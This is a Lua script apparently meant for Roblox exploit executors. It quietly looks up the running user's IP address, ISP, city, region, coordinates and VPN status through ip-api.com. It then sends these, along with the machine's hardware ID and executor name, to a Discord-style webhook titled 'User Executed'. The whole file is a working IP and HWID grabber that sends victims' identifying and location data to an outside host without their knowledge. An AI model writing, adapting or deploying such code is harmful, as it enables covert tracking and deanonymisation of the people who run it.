local function FetchIPData()
    local url = "http://ip-api.com/json/"
    local response = request({
        Url = url,
        Method = "GET"
    })

    if not response or response.StatusCode ~= 200 then
        warn("Failed to fetch IP data (Status: " .. (response and response.StatusCode or "No response") .. ")")
        return nil
    end

    return game:GetService("HttpService"):JSONDecode(response.Body)
end

local function SendIPEmbed(webhookUrl, ipData)
    local embed = {
        title = "User Executed",
        description = "A user executed the script",
        color = 5793266,
        fields = {
            { name = "IP Address", value = "||" .. ipData.query .. "||", inline = true },
            { name = "HWID", value = "||" .. gethwid() .. "||", inline = true },
            { name = "Executor", value = getexecutorname(), inline = true },
            { name = "ISP", value = ipData.isp, inline = true },
            { name = "Organization", value = ipData.org, inline = true },
            { name = "Country", value = string.format("%s :flag_%s:", ipData.country, string.lower(ipData.countryCode)), inline = true },
            { name = "Location", value = "||" .. string.format("%s, %s", ipData.city, ipData.regionName) .. "||", inline = true },
            { name = "Coordinates", value = string.format("||Lat: %.4f | Lon: %.4f||", ipData.lat, ipData.lon), inline = true },
            { name = "Proxy/VPN", value = ipData.proxy and "True" or "False", inline = true },
            { name = "Hosting", value = ipData.hosting and "True" or "False", inline = true }
        },
        footer = {
            text = "Date: " .. os.date("%B %d, %Y at %I:%M %p")
        }
    }

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({ embeds = { embed } })
        })
    end)
end

if FetchIPData() then
    SendIPEmbed("Webhook URL", FetchIPData())
end
